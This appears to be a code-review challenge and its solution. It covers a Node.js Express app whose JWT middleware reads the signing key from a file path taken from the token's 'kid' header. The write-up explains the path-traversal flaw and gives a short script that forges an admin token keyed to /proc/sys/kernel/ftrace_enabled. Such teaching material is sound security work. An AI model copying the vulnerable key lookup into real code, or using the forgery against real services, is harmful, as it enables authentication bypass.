## Code snippet challenge

```javascript
const fs = require('fs');
var jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const app = require('express')();
app.use(cookieParser());

app.use((req, res, next) => {
    const token = req.cookies.session;
    if (!token) return res.sendStatus(403);

    jwt.verify(token, 
      (header, cb) => {
        cb(null, fs.readFileSync(header.kid));
      }, { algorithm: 'HS256' }, (err, data) => {
        if (err) return res.sendStatus(403);
        req.name = data.name;
        return next();
      }
    );
});

app.get('/protected', (req, res) => {
  if (req.name !== 'admin') return res.sendStatus(401);
  res.send('You are the admin!');
});

app.listen(3000);
```

### Solution

We are looking at a node JS application that has a protected endpoint called '/protected' . We see that if request.name is equal to 'admin', we become the admin. Goal of the challenge is exactly that - to become the admin.
There is a middleware used here which is going to take a JWT session token from the cookies and verify it. If it is not valid, then the user is presented with a 403 HTTP response. When the token is verified here, the HS 256 algorith is being used. This is a symmetric algorithm relying on a secret key to sign the token. 
So if we would be able to get that key, when we could sign our malicious token and gain access to the application. Where does the key come from?

It comes from this statement:
```javascript
fs.readFileSync(header.kid));
```

It is a function that gets called with the JWT header and will return the secret.


### What's the secret? 


It reads a file from the filesystem that's defined by "header.kid". So the contents of that file will be the key. This vulnerable to the path traversal vulnerability because using ../ we can have it use any file we want. 
So what if an attacker sets the 'kid' to a file they know, such as "/proc/sys/kernel/ftrace_enabled which either contains '0' or '1'. the attacker would then sign the JWT token with that exact value they know as the key.


Simple code for that woud look like this:


```javascript
var jwt = require('jsonwebtoken');
const token = jwt.sign(
{name: 'admin'},
'1\n',
{
	algorithm: 'HS256',
	keyid: '../../../../proc/sys/kernel/ftrace_enabled'
};
console.log(token);
```
